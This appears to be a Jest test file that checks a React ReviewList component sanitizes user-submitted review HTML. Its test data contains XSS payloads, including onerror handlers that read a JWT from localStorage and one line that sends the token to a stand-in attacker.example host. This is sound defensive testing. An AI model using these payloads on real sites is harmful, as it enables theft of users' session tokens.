import { render } from '@testing-library/react';
import ReviewList from '../../client/src/components/ReviewList';

// A review body a malicious user could submit: it tries to run script that
// reads the JWT out of localStorage (the app stores the token there).
const XSS_BODY =
  'Nice item! ' +
  '<img src=x onerror="window.__xssToken = localStorage.getItem(\'token\')">' +
  '<script>window.__xssRan = true</script>' +
  '<a href="javascript:alert(1)">click me</a>';

function renderReview(body) {
  const reviews = [{ _id: 'r1', rating: 5, author: { name: 'attacker' }, body }];
  return render(<ReviewList reviews={reviews} />);
}

describe('ReviewList renders review HTML safely', () => {
  test.each([
    '<img src=x onerror="alert(\'XSS — your token: \'+localStorage.getItem(\'token\'))">',
    '<img src=x onerror="fetch(\'https://attacker.example/steal?t=\'+localStorage.getItem(\'token\'))">',
    '<svg onload="alert(localStorage.getItem(\'token\'))"></svg>',
    '<script>alert(1)</script>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<a href="jav&#x61;script:alert(1)" onclick="alert(1)">link</a>'
  ])('removes active markup from attack: %s', (payload) => {
    const { container } = renderReview(payload);
    expect(container.querySelector('script, img, svg, iframe, object, embed')).toBeNull();
    for (const element of container.querySelectorAll('.review-body *')) {
      for (const attribute of element.attributes) {
        expect(attribute.name).not.toMatch(/^on/i);
      }
    }
    const link = container.querySelector('a');
    if (link) expect(link.hasAttribute('href')).toBe(false);
  });

  test('preserves legitimate formatting and safe links', () => {
    const { container } = renderReview(
      '<p>Great <b>seller</b> and <em>service</em>!<br>' +
      '<a href="https://example.com/item" title="Item">Details</a></p>' +
      '<ul><li>Fast delivery</li></ul>'
    );
    expect(container.querySelector('b')).toHaveTextContent('seller');
    expect(container.querySelector('em')).toHaveTextContent('service');
    expect(container.querySelector('br')).not.toBeNull();
    expect(container.querySelector('li')).toHaveTextContent('Fast delivery');
    expect(container.querySelector('a')).toHaveAttribute('href', 'https://example.com/item');
  });

  test('removes styles, forms and DOM-clobbering attributes', () => {
    const { container } = renderReview(
      '<form action="https://attacker.example"><input name="token"></form>' +
      '<p id="root" style="position:fixed" data-payload="x">Review</p>'
    );
    expect(container.querySelector('form, input, [style], [id], [data-payload]')).toBeNull();
    expect(container.textContent).toContain('Review');
  });

  test('does not render any <script> element from the review body', () => {
    const { container } = renderReview(XSS_BODY);
    expect(container.querySelector('script')).toBeNull();
  });

  test('strips inline event-handler attributes such as onerror', () => {
    const { container } = renderReview(XSS_BODY);
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(container.querySelector('[onload]')).toBeNull();
    expect(container.querySelector('[onclick]')).toBeNull();

    const img = container.querySelector('img');
    if (img) expect(img.getAttribute('onerror')).toBeNull();
  });

  test('does not keep javascript: URLs on links', () => {
    const { container } = renderReview(XSS_BODY);
    const link = container.querySelector('a');
    if (link) {
      expect((link.getAttribute('href') || '').toLowerCase()).not.toMatch(/^javascript:/);
    }
  });

  test('still renders the benign review text', () => {
    const { container } = renderReview(XSS_BODY);
    expect(container.textContent).toContain('Nice item!');
  });
});
